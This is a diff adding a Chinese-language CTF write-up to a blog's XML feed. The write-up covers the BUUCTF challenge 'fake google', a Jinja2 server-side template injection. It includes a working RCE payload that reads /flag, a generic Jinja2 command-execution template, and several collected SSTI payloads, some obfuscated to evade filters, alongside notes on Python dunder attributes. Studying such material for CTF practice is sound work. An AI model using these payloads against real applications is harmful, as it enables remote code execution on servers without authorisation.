@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题026</title>
+    <link href="/2021/02/09/BUU026/"/>
+    <url>/2021/02/09/BUU026/</url>
+    
+    <content type="html"><![CDATA[<h2 id="二十六、"><a href="#二十六、" class="headerlink" title="二十六、"></a>二十六、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[BJDCTF 2nd]fake google<br><img src="https://ftp.bmp.ovh/imgs/2021/02/699942b36831db1a.png"> </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码中没发现什么<br>随便输个看看<img src="https://ftp.bmp.ovh/imgs/2021/02/1e1ee07b33ec1f28.png"><br>不知道提示的什么意思，看了wp知道是ssti模板注入<br>按下图判断模板引擎<img src="https://ftp.bmp.ovh/imgs/2021/02/cd1b1a2982003c38.png"><br>输入：<code>&#123;&#123;7*7&#125;&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/02/ec6e2a009fa2999d.png">所以应该是jinja2；如果用tplmap的话可以直接得到是jinja2         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p><p>一位大佬的jinja2模板引擎通用的RCE payload：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br><command>是要执行的命令       </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>payload相关函数      </p><blockquote><p><code>__class__</code> 返回类型所属的对象<br><code>__subclasses__ </code>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__init__ </code>类的初始化方法<br><code>__globals__</code> 对包含函数全局变量的字典的引用<br><code>__mro__</code>返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析<br><code>__bases__ </code>返回该对象所继承的基类<br><code> __builtins__</code>是做为默认初始模块        </p></blockquote><p>jinja2语法       </p><blockquote><p>控制结构<code>&#123;% %&#125;</code><br>变量取值<code>&#123;&#123; &#125;&#125;</code><br>jinja2模板中使用 <code>&#123;&#123; &#125;&#125;</code> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等<br>注释<code>&#123;# #&#125;</code><br><a href="https://www.jianshu.com/p/f04dae701361">MORE</a>      </p></blockquote><p>抄一下大佬收集的payload        </p><blockquote><ol><li><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code>         </li><li><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )&#125;&#125;</code>                </li><li><code>&#123;&#123;object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')&#125;&#125;</code>     </li><li><code>&#123;&#123;request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')&#125;&#125;</code>    <a href="https://www.jianshu.com/p/e341b7b7d4f3">转</a>       </li></ol></blockquote>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题025</title>
     <link href="/2021/02/08/BUU025/"/>
     <url>/2021/02/08/BUU025/</url>
